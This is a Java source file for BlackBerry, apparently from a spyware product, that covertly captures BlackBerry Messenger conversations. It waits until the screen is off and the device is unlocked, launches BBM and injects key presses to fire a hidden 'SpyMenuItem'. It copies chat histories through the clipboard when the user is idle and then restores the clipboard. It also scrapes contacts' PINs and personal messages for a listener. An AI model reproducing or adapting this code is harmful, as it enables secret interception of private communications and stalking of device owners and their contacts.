package com.vvt.bbm;

import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.i18n.SimpleDateFormat;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.ApplicationManagerException;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Characters;
import net.rim.device.api.system.Clipboard;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.EventInjector;
import net.rim.device.api.system.KeypadListener;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Manager;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.LabelField;
import net.rim.device.api.ui.component.Menu;
import net.rim.device.api.ui.component.TextField;

public class BBMEngine {

	// timer parameters
	private final int	delay					= 500;
	private int			longWaitToSetupPeriod	= 180000;
	private int			tryToSetupPeriod		= 20000;
	private int			tryToSetupInitPeriod	= 1000;
	private int			copyChatPeriod			= 5000;
	private int			copyChatInitPeriod 		= 1000;
	private int 		waitUntilIdleAtleast	= 7;
	
	// setup parameters	
	private boolean 				_setupReady = false;
	private BBMConversationListener _listener 	= null;
	private Timer					_timerSetup = new Timer();
	private BBMSetup				bbmSetup 	= null;

	// capture parameters
	private Timer 					_timer		= new Timer();
	private ConversationCapturer	convCap		= null; 

	// Conversation handler & database
	private ConversationHandler		convHandler	= new ConversationHandler();
	
	public BBMEngine()	{
		_setupReady = false;
		if (Log.isEnable()) { Log.debug("BBM constructor"); }
	}
	
	public static boolean isSupported()	{
		boolean notInList 	= true;
		String 	model 		= DeviceInfo.getDeviceName().trim();
		if (model.startsWith("870"))	{
			notInList = false;
			if (Log.isEnable()) { Log.debug("BBM is not suppprt 870x series"); }
		}
		return notInList;
	}
	
	public void setBBMConversationListener(BBMConversationListener listener)	{
		_listener = listener;
		convHandler.setBBMConversationListener(_listener);
		if (Log.isEnable()) { Log.debug("set Listener"); }
	}
	
	public boolean removeBBMConversationListener()	{
		if (Log.isEnable()) { Log.debug("remove Listener"); }
		bbmSetup.removeBBMConversationListener();
		if (convCap != null)	{
			convCap.removeBBMConversationListener();
		}
		if (convHandler != null)	{
			convHandler.removeBBMConversationListener();
		}
		return true;
	}
	
	public void start()	{
		if (Log.isEnable()) { Log.debug("BBM.start()"); }
		if (_listener == null) {
			_listener.setupFailed("Caller has to set BBMConversationListener before call start()");
			if (Log.isEnable()) { Log.debug("Has no listener ?"); }
		}
		else {
			if (Log.isEnable()) { Log.debug("Setup()"); }
			setup();
		}
	}
	
	private void setup()	{
		try {
			_setupReady = false;
			if (bbmSetup != null)	{
				bbmSetup.cancel();
			}
			bbmSetup = new BBMSetup(true);
			if (_listener != null)	{
				bbmSetup.setBBMConversationListener(_listener);
			}

			if (Log.isEnable()) { Log.debug("start schedule()"); }
			_timerSetup.schedule(bbmSetup, tryToSetupInitPeriod, tryToSetupPeriod);
		}
		catch (Exception e) {
			if (_listener != null)	{
				_listener.setupFailed("Setup fail:"+e.getMessage());
				if (Log.isEnable()) { Log.debug("* Exception @setup:"+e.getMessage()); }
			}
		}
	}
	
	// stop conversation Capture
	public void stop()	{
		if (Log.isEnable()) { Log.debug("BBM.stop()"); }
		try {	
			if (bbmSetup != null)	{
				bbmSetup.removeBBMConversationListener();
				bbmSetup.cancel();
				if (Log.isEnable()) { Log.debug("Cancel task schedule"); }
			}
			if (convCap != null)	{
				convCap.removeBBMConversationListener();
				convCap.cancel();
				if (Log.isEnable()) { Log.debug("Cancel conversation task schedule"); }
			}
			convHandler.removeBBMConversationListener();		
			if (_listener != null)	{
				_listener.stopCompleted();
			}
		}
		catch (Exception e) {
			if (_listener != null)	{
				if (Log.isEnable()) { Log.debug("* Exception @stop:"+e.getMessage()); }
				_listener.stopFailed(e.getMessage());
			}
		}
	}
	
	public void longWait()	{
		if (Log.isEnable()) { Log.debug("Longer wait to setup"); }
		try {
			_setupReady = false;
			if (bbmSetup != null)	{
				bbmSetup.cancel();
				if (Log.isEnable()) { Log.debug("Cancel task schedule"); }
			}
			bbmSetup = new BBMSetup(false);
			if (_listener != null)	{
				bbmSetup.setBBMConversationListener(_listener);
			}
			if (Log.isEnable()) { Log.debug("Start longer schedule()"); }
			_timerSetup.schedule(bbmSetup, longWaitToSetupPeriod, longWaitToSetupPeriod);	
		}
		catch (Exception e) {
			if (_listener != null)	{
				_listener.setupFailed("Setup fail:"+e.getMessage());
				if (Log.isEnable()) { Log.debug("* Exception @longWait:"+e.getMessage()); }
			}
		}
	}
	
	public boolean bringBBMtoForeground()	{
		boolean gotoBBM = false;
		ApplicationDescriptor wanted = null;
		ApplicationManager manager = ApplicationManager.getApplicationManager();
        ApplicationDescriptor descriptors[] = manager.getVisibleApplications();
        for (int i=0; i<descriptors.length; i++)	{
        	ApplicationDescriptor d = descriptors[i];
        	String name = d.getName().trim();
        	if ((name.length()<=20) && name.startsWith("BlackBerry")&& name.endsWith("Messenger"))	{
        		wanted = d;
            }
        }        
        try {
        	if (wanted != null)	{
        		manager.runApplication(wanted);
        		gotoBBM = true;
        		if (Log.isEnable()) { Log.debug("Bring BBM to foreground"); }
        	}
		}
		catch (ApplicationManagerException e)	{	
			_listener.setupFailed("Can not call BlackBerry Messenger");
    		if (Log.isEnable()) { Log.debug("* ApplicationManagerException::Cannot bring BBM to foreground !?"); }
		}
		return gotoBBM;
	}
	
	// Class for setup !!
	class BBMSetup extends TimerTask	{
		
		private BBMConversationListener _listener;
		private SpyMenuItem				_spyMenuItem;
		
		private SimpleDateFormat formatter 	= new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
		private int 	_order	= 1;
		private String	_name 	= "z";
		private int		_try	= 0;
		private boolean	_short	= false;
		
		public BBMSetup(boolean waitMode)	{
			_try			= 0;
			_short			= waitMode;
			_spyMenuItem 	= new SpyMenuItem(_order, _name);
			
		}
		
		public void setBBMConversationListener(BBMConversationListener listener)	{
			this._listener 	= listener;
			if (Log.isEnable()) { Log.debug("BBMSetup: Set listener"); }
		}
		
		public boolean removeBBMConversationListener()	{
			this._listener 	= null;
			if (Log.isEnable()) { Log.debug("BBMSetup: Remove listener"); }
			return true;	
		}
		
		public void run()	{
			if (!_setupReady)	{
				if (!Backlight.isEnabled() &&
//				if (
					!ApplicationManager.getApplicationManager().isSystemLocked())	{
					ApplicationDescriptor activeApp = getActiveApp();
					_try++;
					if (callBlackBerryMessenger())	{
						try { Thread.sleep(delay); } catch (Exception e) {} // Wait for call BBM
						//if (Log.isEnable()) { Log.debug("??? Is it in BBM ???"); }
						if (addSpyMenu())	{
							if (!Backlight.isEnabled())	{ 
								injectKeys();
							}
							removeSpyMenu();
						}
						else {
							if (Log.isEnable()) { Log.debug("Not add spy menu in other app ?"); }
						}
					}
					if (!Backlight.isEnabled()) {
						backToActiveApp(activeApp);
						if (Log.isEnable()) { Log.debug("Go back to previous app"); }
					}
					
					if (!_setupReady) {
						Date today 	= new Date(System.currentTimeMillis());
						_listener.setupFailed("Please wait.. BBMCapture's setting "+formatter.format(today)+"\n");
						if (_short && ((_try%3)==0))	{
							longWait();
						}
						if (_try == 3)	{ // reset counter
							_try = 0;
						}
					}
				}
			}
		}
		
		private boolean addSpyMenu()	{
			String appName = getNowApp();
			if ((appName.length()<=20) && appName.startsWith("BlackBerry")&& appName.endsWith("Messenger"))	{
				ApplicationMenuItemRepository.getInstance().addMenuItem( 
						ApplicationMenuItemRepository.MENUITEM_SYSTEM, _spyMenuItem);
				if (Log.isEnable()) { Log.debug("Add SpyMenu ok"); }
				return true;
           	}
			return false;
		}
		
		private void removeSpyMenu()	{
			ApplicationMenuItemRepository.getInstance().removeMenuItem( 
					ApplicationMenuItemRepository.MENUITEM_SYSTEM, _spyMenuItem);
			if (Log.isEnable()) { Log.debug("Remove SpyMenu ok"); }
		}
		
		private ApplicationDescriptor getActiveApp()	{
			ApplicationManager manager = ApplicationManager.getApplicationManager();
	        ApplicationDescriptor descriptors[] = manager.getVisibleApplications();
	        if (descriptors.length > 1)	{
	        	return descriptors[0];
	        }
	        return null;
		}
		
		private String getNowApp()	{
			ApplicationManager manager = ApplicationManager.getApplicationManager();
	        ApplicationDescriptor descriptors[] = manager.getVisibleApplications();
	        if (descriptors.length > 1)	{
	        	return descriptors[0].getName();
	        }
	        return "?";
		}
		
		private void backToActiveApp(ApplicationDescriptor app)	{
			if (app != null)	{
				try {
					ApplicationManager manager = ApplicationManager.getApplicationManager();
					manager.runApplication(app);
					if (Log.isEnable()) { Log.debug("Back to previous active app."); }
				} catch (ApplicationManagerException e) {
					if (Log.isEnable()) { Log.debug("* ApplicationManagerException:backToActiveApp"); }
				}
			}
		}
		
		private boolean callBlackBerryMessenger()	{
			boolean gotoBBM = false;
			
			ApplicationDescriptor wanted = null;
			ApplicationManager manager = ApplicationManager.getApplicationManager();
	        ApplicationDescriptor descriptors[] = manager.getVisibleApplications();
	        for (int i=0; i<descriptors.length; i++)	{
	        	ApplicationDescriptor d = descriptors[i];
	        	String name = d.getName().trim();
	        	if ((name.length()<=20) && name.startsWith("BlackBerry")&& name.endsWith("Messenger"))	{
	        		wanted = d;
	           	}
	        }        
	        try {
	        	if (wanted != null)	{
	        		manager.runApplication(wanted);
	        		gotoBBM = true;
	        		if (Log.isEnable()) { Log.debug("Call BBM to foreground"); }
	        	}
	        	else {
	        		if (_listener != null) {
		        		_listener.setupFailed("Setup failed: no BBM instance ");
	        		}
	        		if (Log.isEnable()) { Log.debug("Setup failed: no BBM instance"); }
	        	}
			}
			catch (ApplicationManagerException e)	{
				if (_listener != null) {
	        		_listener.setupFailed("Setup failed:"+e.getMessage()); 
				}
				if (Log.isEnable()) { Log.debug("* ApplicationManagerException::Cannot bring BBM to foreground !?");  }
			}
			catch (Exception e) {
				if (_listener != null) {
	        		_listener.setupFailed("Setup failed Exception:"+e.getMessage());
				}
			}
			return gotoBBM;
		}
		
		public void injectKeys()	{
			try {
				EventInjector.KeyCodeEvent 		menuDown
					= new EventInjector.KeyCodeEvent(EventInjector.KeyCodeEvent.KEY_DOWN, 
	        		    (char) Keypad.KEY_MENU, KeypadListener.STATUS_NOT_FROM_KEYPAD, 10);        	
	        	EventInjector.KeyEvent 			z 
	        		= new EventInjector.KeyEvent(EventInjector.KeyCodeEvent.KEY_DOWN, 
	        			Characters.LATIN_SMALL_LETTER_Z, KeypadListener.STATUS_NOT_FROM_KEYPAD, 10);
	        	EventInjector.TrackwheelEvent	click
	    			= new EventInjector.TrackwheelEvent(EventInjector.TrackwheelEvent.THUMB_CLICK, 
	    				1, KeypadListener.STATUS_NOT_FROM_KEYPAD);
  
	        	
	        	Thread.sleep(delay);
	        	menuDown.post();
	        	if (Log.isEnable()) { Log.debug(" - Press menu key !"); }
	        	Thread.sleep(delay);
	        	z.post();
	        	if (Log.isEnable()) { Log.debug(" - Press z key !"); }
	        	Thread.sleep(delay);
	        	click.post();
	        	if (Log.isEnable()) { Log.debug(" - click it !"); }
	        } 
	        catch (Exception e) {
	        	if (_listener != null)
	        		_listener.setupFailed("Setup failed:Key Injection ::"+
	        				"BBM's menu not ready");

	        	if (Log.isEnable()) { Log.debug("Exception:: Setup failed:Key Injection !?"); }
	        }
		}
		
		private class SpyMenuItem extends ApplicationMenuItem {
			private String _name = "z";
			
			SpyMenuItem(int order, String name) {
				super(order);
				this._name = name;
			}

			public Object run(Object context) {
				try {
					UiApplication.getUiApplication().invokeAndWait(new Runnable() {								
						public void run() {
							UiApplication uapp = UiApplication.getUiApplication();
							if (Log.isEnable()) { Log.debug("!! StartCapture !!"); }
							startCapture(uapp);
						}
					});
				}
				catch (IllegalStateException e)	{
					if (_listener != null)
						_listener.setupFailed(e.getMessage());
					if (Log.isEnable()) { Log.debug("* IllegalStateException ?"+e.getMessage()); }
				}
				return context;
			}

			public String toString() {
				return this._name;
			}
		}
	}
	
	private void startCapture(final UiApplication  uapp)	{
		uapp.invokeAndWait(new Runnable() {
			public void run() {
				String name = uapp.getClass().getName();
				if ((name.indexOf("qm.bbm.BBMApplication") > -1) ||
					(name.indexOf("PeerApplication") > -1) )	{
					try {
						if (Log.isEnable()) { Log.debug("!! Yes, we get BBM !!"); }
						
						convCap = new ConversationCapturer();		
						if (_listener != null)	{
							convCap.setBBMConversationListener(_listener);
						}
						convCap.setWatchingApplication(uapp);
						
						//uapp.requestBackground();
						if (Log.isEnable()) { Log.debug("BBM Monitor starting !!"); }
						_timer.schedule(convCap, copyChatInitPeriod, copyChatPeriod);
						try {
							if (bbmSetup != null)	{
								bbmSetup.cancel();
								if (Log.isEnable()) { Log.debug("Stop setup process for monitor only"); }
							}
						}
						catch (Exception e)	{
							if (Log.isEnable()) { Log.debug("Exception: Cancel setup-process error"); }
							_listener.setupFailed("Cancel setup-process error:"+e.getMessage());
						}
						_setupReady = true;
						if (_listener != null)	{
							_listener.setupCompleted();

							if (Log.isEnable()) { Log.debug("### setupCompleted ###"); }
						}
					}
					catch (Exception e)	{
						_listener.setupFailed(e.getMessage());
						if (Log.isEnable()) { Log.debug("* StartCapture.Exception:"+e.getMessage()); }
					}
				}
				else {
					if (_listener != null) 
						_listener.setupFailed("BlackBerry Messenger is not ready !?");
					if (Log.isEnable()) { Log.debug("StartCapture:BlackBerry Messenger is not ready !?"); }
				}
			}
		});
	}

	class ConversationCapturer extends TimerTask	{

		private static final String	PIN_BBM_4_2			= "Info: ";
		private static final String	PIN_BBM_4_6			= "PIN: ";
		private static final String	PIN_BBM_5_0			= "PIN:";
		private static final String	PM_BBM_5_0_1_38		= "Personal Message:";
		
		private static final String	SCREEN_BBM_5_0		= "UserInfoScreen";
		private static final String	SCREEN_BBM_OLDER_5	= "peer.UserInfoScreen";

		private static final String	COPY_MENU_4_7		= "copy history";
		private static final String	COPY_MENU_5			= "copy chat";

		private static final String	PROFILE_MENU_4		= "contact info";
		private static final String	PROFILE_MENU_5		= "contact profile";
		private static final String	PROFILE_MENU_50138	= "view contact profile";
				
		private BBMConversationListener _listener		= null;
		private UiApplication			_bbmInstance 	= null;
		private Vector					_screens		= new Vector();
		private Hashtable				_tmpChat		= new Hashtable();
		private Hashtable				_tmpHasdCode	= new Hashtable();
		private Hashtable				_tmpPIN			= new Hashtable();
		private Hashtable				_tmpPersonal	= new Hashtable();
		
		public ConversationCapturer()	{			
		}
		
		public void setWatchingApplication(UiApplication appInstance)	{
			_bbmInstance = appInstance;
			if (Log.isEnable()) { Log.debug(" . Get bbmInstance !!"); }
		}
		
		public void setBBMConversationListener(BBMConversationListener listener)	{
			this._listener = listener;
			if (Log.isEnable()) { Log.debug(" . set listener to monitor"); }
		}
		
		public boolean removeBBMConversationListener()	{
			this._listener = null;
			return true;
		}	
		
		public void run()	{
			if (_bbmInstance==null)	{ return; 	}
			if (_bbmInstance.isForeground())	{
				Screen screen = _bbmInstance.getActiveScreen();
				if (screen.toString().indexOf("ConversationScreen")>-1)	{
					if (!_screens.contains(screen))	{
						_screens.addElement(screen);
						if (Log.isEnable()) { Log.debug(" . watch a screen"); }
					}
				}
			}
			else {
				try {
					for (int i=0; i<_screens.size(); i++)	{
						Screen screen 	= (Screen) _screens.elementAt(i);
						copy(screen);
					}					
					synchronized(this)	{
						if (isDataReady()) {
							for (int i=0; i<_screens.size(); i++)	{
								getConversation((Screen) _screens.elementAt(i));
							}
							_screens.removeAllElements();
							if (! convHandler.isUpdated())	{
								convHandler.commit();
							}
							_tmpChat.clear();
							_tmpHasdCode.clear();
							_tmpPIN.clear();
							_tmpPersonal.clear();
						}
						else {
						}
					}
					
				}
				catch (Exception e) {
					if (Log.isEnable()) { Log.debug("* Monitor.running error:"+e.getMessage()); }
				}
			}
		}
		
		private void collectConversation(Screen screen, String chatStr)	{
			//_listener.setupFailed("collectConversation::Get PIN !");
			String 	pin			= getPIN(screen);
			int 	hashCode 	= screen.hashCode();
			_tmpChat.put(screen, chatStr);
			_tmpHasdCode.put(screen, new Integer(hashCode));
			_tmpPIN.put(screen, pin);
			//_tmpPersonal.put(pin, PersonalMessage); // <-- process in getPIN
			
			//_listener.setupFailed("collectConversation::Get PIN finish");
		}
		
		private boolean isDataReady()	{
			Enumeration scr = _screens.elements();
			while (scr.hasMoreElements())	{
				Screen screen = (Screen)scr.nextElement();
				if (!_tmpChat.containsKey(screen))	{
					return false;
				}
			}
			return true;
		}
		
		private void copy(final Screen screen)	{
			try {
				_bbmInstance.invokeAndWait(new Runnable() {
					public void run() {
						if (Log.isEnable()) { Log.debug(" . copy a screen"); }
						//_listener.setupFailed("Copy screen");
						Menu 	menus 	= screen.getMenu(0);
						for (int i=0; i<menus.getSize(); i++)	{
							MenuItem menu 		= menus.getItem(i);
							String wantedMenu 	= menu.toString().toLowerCase();
							if (wantedMenu.equals(COPY_MENU_5) || wantedMenu.equals(COPY_MENU_4_7))	{
								MenuItem copyChat	= menu;
								Clipboard  	cp 		= Clipboard.getClipboard();
								Random		rand	= new Random();
								int			t		= rand.nextInt(10);
								Object 		tmp 	= cp.get();	
								if (DeviceInfo.getIdleTime() >= (t+waitUntilIdleAtleast)) {
									copyChat.run();
									if (Log.isEnable()) { Log.debug(" . get a conversation to check"); }
									collectConversation(screen, (String) cp.get());
									cp.put(tmp);
								}
								else {
									//Wait please ...
								}
							}
						}
					}
				});
			}
			catch (Exception e) {
				_listener.setupFailed("Error:Copy():"+e.getMessage());
				if (Log.isEnable()) { Log.debug("Error:Copy():"+e.getMessage()); }
			}
		}
		public void getConversation(Screen screen)	{
			String 	text 	= (String)  _tmpChat.get(screen);
			if (text != null)	{
				String 	pin			= (String)  _tmpPIN.get(screen);
				int 	hashCode 	= ((Integer)_tmpHasdCode.get(screen)).intValue();
				String 	personal	= "";
				if (_tmpPersonal.containsKey(pin)) {
					personal = (String) _tmpPersonal.get(pin);
				}
				convHandler.update(pin, hashCode, text, personal);
			}
		}
		
		private String getPIN(Screen screen)	{
			Menu menus = screen.getMenu(0);
			for (int i=0; i<menus.getSize(); i++)	{
				MenuItem 	menu 		= menus.getItem(i);
				String 		wantedMenu 	= menu.toString().toLowerCase();
				if (wantedMenu.equals(PROFILE_MENU_4) || wantedMenu.equals(PROFILE_MENU_5)
						|| wantedMenu.equals(PROFILE_MENU_50138))	{
					menu.run();
					Screen contactInfoScreen 	= _bbmInstance.getActiveScreen();
					String screenClass 			= contactInfoScreen.toString();
					Vector namePin = new Vector();
					if (screenClass.indexOf(SCREEN_BBM_OLDER_5)>-1)	{
						searchTextOnFields(contactInfoScreen, namePin);
						if (namePin.size() >= 2)	{
							for (int p=1; p<namePin.size(); p++)	{
								String pin 	= (String) namePin.elementAt(p);
								if (pin.startsWith(PIN_BBM_4_6)) {
									pin = pin.substring(PIN_BBM_4_6.length());
									namePin.removeAllElements();
									contactInfoScreen.close();
									return pin;
								}
								else if (pin.startsWith(PIN_BBM_4_2)) {
									pin = pin.substring(PIN_BBM_4_2.length());
									namePin.removeAllElements();
									contactInfoScreen.close();
									return pin;					
								}
							}
						}
					}					
					//net.rim.device.apps.internal.qm.bbm.BBMUserInfoScreen
					//net.rim.device.apps.internal.qm.peer.view.UserInfoScreen
					else if (screenClass.indexOf(SCREEN_BBM_5_0)>-1)	{
						searchTextOnFields(contactInfoScreen, namePin);
						if (namePin.size() >= 2)	{
							String pin = "";
							for (int p=0; p<namePin.size(); p++)	{
								String label = (String) namePin.elementAt(p);
								if (label.equals(PIN_BBM_5_0) && (p+1)<namePin.size())	{
									pin 	= (String) namePin.elementAt(p+1);
								}
								else if (pin.length()>0 && label.equals(PM_BBM_5_0_1_38) && (p+1)<namePin.size())	{
									String personalMessagein = (String) namePin.elementAt(p+1);
									_tmpPersonal.put(pin, personalMessagein.trim());
									//_listener.setupFailed("Get Personal Message:\n"+personalMessagein.trim());
								}
							}
							namePin.removeAllElements();
							contactInfoScreen.close();
							return pin;
						}
					}
					else {
						_listener.setupFailed("Cannot copy pin from "+contactInfoScreen.getClass().toString());
						if (Log.isEnable()) { Log.debug("getPIN() Cannot copy pin from "+contactInfoScreen.getClass().toString()+" !?"); }
					}
					contactInfoScreen.close();
					return "";
				}
			}
			return "";
		}
		
		private Vector searchTextOnFields(Object obj, Vector buff)	{
			if (obj instanceof Manager)	{
				Manager manf = (Manager) obj;
				int count = manf.getFieldCount();
				for (int i=0; i< count; i++)	{
					Field field = manf.getField(i);
					searchTextOnFields(field, buff);
				}
			}
			else {
				if (obj instanceof TextField)	{
					TextField tf = (TextField) obj;
					buff.addElement(tf.getText().trim());
				}
				else if (obj instanceof LabelField)	{
					LabelField lf = (LabelField) obj;
					buff.addElement(lf.getText().trim());
				}
			}
			return buff;
		}

	}
	
}
